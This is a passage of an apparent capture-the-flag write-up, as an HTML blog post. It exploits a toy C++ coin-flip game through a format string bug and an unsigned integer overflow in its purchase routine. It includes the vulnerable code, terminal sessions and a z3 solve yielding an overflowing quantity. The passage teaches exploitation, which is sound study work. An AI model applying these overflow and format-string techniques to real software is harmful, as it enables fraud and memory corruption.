&lt;p&gt;My question was answered when I looked a little bit further down and remembered the format string vulnerability. The line that says &lt;code class=&quot;highlighter-rouge&quot;&gt;printf(name.c_str())&lt;/code&gt; prints out our name directly using &lt;code class=&quot;highlighter-rouge&quot;&gt;printf()&lt;/code&gt; instead of using a format string (The secure way of doing this would be to use &lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;%s&quot;, name.c_str())&lt;/code&gt;). We could exploit the format string vulnerability by putting string formatters in &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;At this point in time, we have two goals:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Find a vulnerability that allows us to buy the &lt;code class=&quot;highlighter-rouge&quot;&gt;shout-out-from-literally-god&lt;/code&gt; option.&lt;/li&gt;
  &lt;li&gt;Exploit the format string vulnerability to write anything (other than zero) to the address &lt;code class=&quot;highlighter-rouge&quot;&gt;god_is_really_happy&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Instead of doing step one, you could also try to brute-force the program until you got enough money, but I didn’t go with that solution.&lt;/p&gt;

&lt;p&gt;The first vulnerability took me a long time to see. I manually inputted various characters when the program asked for a specific type of input, and I was specifically looking for integer overflow vulnerabilities that increased my money (though, I would later find out that increasing my money was not necessary). Typing -1 when betting did not work.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Current funds: $150
Your options are:
1: Place a bet on a coin flip for a chance to double your money
2: Go mining to earn some money
3: Buy things
4: Quit (Your money will not be saved)
Please enter a number 1-4 to continue...
1
A coin will be flipped. Before the coin is flipped, you may pick heads or tails. If you guess correctly, any money you bet will be doubled. Otherwise, the money will be forfeit. Enter heads, tails, or cancel
heads
How much would you like to bet that the coin will come up heads? Enter a number between 1 and 150.
-1
How much would you like to bet that the coin will come up heads? Enter a number between 1 and 150.
-1
How much would you like to bet that the coin will come up heads? Enter a number between 1 and 150.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, when I did the same thing while buying something, the program said that I didn’t have enough money to buy encouragement, even though I did. The only reasonable explanation for this behavior would be that it interprets the quantity as an unsigned integer, even though I am typing it as a signed integer.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3
What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
encouragement
How many would you like to buy? Must be greater than 0
-1
You don't have the money for that!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I spent a few minutes trying out a bunch of different negative numbers to see if any of them would allow me to actually buy &lt;code class=&quot;highlighter-rouge&quot;&gt;encouragement&lt;/code&gt;. Although I was unsuccessful by simply using trial-and-error, this was enough to pique my interest, so I decided to take another look at the code for purchasing items. In the top half of the &lt;code class=&quot;highlighter-rouge&quot;&gt;purchase()&lt;/code&gt;, we can see exactly how the quantity is interpreted.&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;purchase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prices&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;tool&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;encouragement&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;shout-out-from-literally-god&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000000000000000ULL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{};&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;What would you like to buy? Options are &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prices&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; (cost: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;second&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;), &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;or cancel&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;cancel&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prices&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prices&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;How many would you like to buy? Must be greater than 0&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;good&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item_cost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prices&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;total&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item_cost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;total&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;player_funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;You don't have the money for that!&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;player_funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;total&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are four variables that we care about in this code. All four of these variables are stored as &lt;code class=&quot;highlighter-rouge&quot;&gt;unsigned long long&lt;/code&gt;, which is 64 bits on my system.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;player_funds&lt;/code&gt; - Contains our money&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;item_cost&lt;/code&gt; - The price of the thing we want to buy&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;count&lt;/code&gt; - The quantity that we typed in&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;total&lt;/code&gt; - Equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;item_cost * count&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;What if we could input the value &lt;code class=&quot;highlighter-rouge&quot;&gt;count&lt;/code&gt; such that &lt;code class=&quot;highlighter-rouge&quot;&gt;total&lt;/code&gt; is something that is less than the actual price of &lt;code class=&quot;highlighter-rouge&quot;&gt;item&lt;/code&gt;? This could allow us to buy items that we do not have enough money for. In other words, we want &lt;code class=&quot;highlighter-rouge&quot;&gt;count&lt;/code&gt; to be a value such that &lt;code class=&quot;highlighter-rouge&quot;&gt;count * item_cost &amp;lt; player_funds&lt;/code&gt;. However, we cannot simply input 0 as count because the program checks for zeros.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3
What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
encouragement
How many would you like to buy? Must be greater than 0
0
How many would you like to buy? Must be greater than 0
0
How many would you like to buy? Must be greater than 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We know that we can type in signed integers and have them be interpreted as unsigned integers, so what if we tried a value for &lt;code class=&quot;highlighter-rouge&quot;&gt;count&lt;/code&gt; that was negative? In order to find such a value for &lt;code class=&quot;highlighter-rouge&quot;&gt;count&lt;/code&gt;, I decided to use &lt;code class=&quot;highlighter-rouge&quot;&gt;z3&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Python&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;3.8.5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Jul&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2020&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GCC&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;9.3.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;linux&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;copyright&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;credits&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;more&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;z3&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;total&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BitVec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'total'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;player_funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BitVec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'player_funds'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item_cost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BitVec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'item_cost'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BitVec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'count'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;total&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item_cost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item_cost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000000000000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ULE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;total&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;player_funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;player_funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;150&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;total&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9223372036854775808&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;player_funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;150&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;item_cost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000000000000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let me explain how this code works. First of all, we create the four variables that we care about: &lt;code class=&quot;highlighter-rouge&quot;&gt;total&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;player_funds&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;item_cost&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;count&lt;/code&gt;. We initialize each of these variables by using a bit vector with 64 bits (since &lt;code class=&quot;highlighter-rouge&quot;&gt;unsigned long long&lt;/code&gt; variables are 64 bits on my machine). We then solve the problem using the following constraints:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Make sure that &lt;code class=&quot;highlighter-rouge&quot;&gt;total&lt;/code&gt; is equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;item_cost * count&lt;/code&gt; because that is how &lt;code class=&quot;highlighter-rouge&quot;&gt;total&lt;/code&gt; is calculated in the code.&lt;/li&gt;
  &lt;li&gt;Make sure that the &lt;code class=&quot;highlighter-rouge&quot;&gt;item_cost&lt;/code&gt; is the price of &lt;code class=&quot;highlighter-rouge&quot;&gt;shout-out-from-literally-god&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Make sure that &lt;code class=&quot;highlighter-rouge&quot;&gt;count&lt;/code&gt; is negative so that we can actually do the integer overflow.&lt;/li&gt;
  &lt;li&gt;Make sure that &lt;code class=&quot;highlighter-rouge&quot;&gt;total &amp;lt;= player_funds&lt;/code&gt;. Note that I used &lt;code class=&quot;highlighter-rouge&quot;&gt;ULE()&lt;/code&gt; here because it makes unsigned comparisons.&lt;/li&gt;
  &lt;li&gt;Make sure that &lt;code class=&quot;highlighter-rouge&quot;&gt;player_funds&lt;/code&gt; is equal to 150, which is the amount that we always start with.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The program returned a solution of &lt;code class=&quot;highlighter-rouge&quot;&gt;count = 9223372036854775808&lt;/code&gt;. To see why this solution works, take a look at the following:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000000000000000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9223372036854775808&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;9223372036854775808000000000000000&lt;/span&gt;
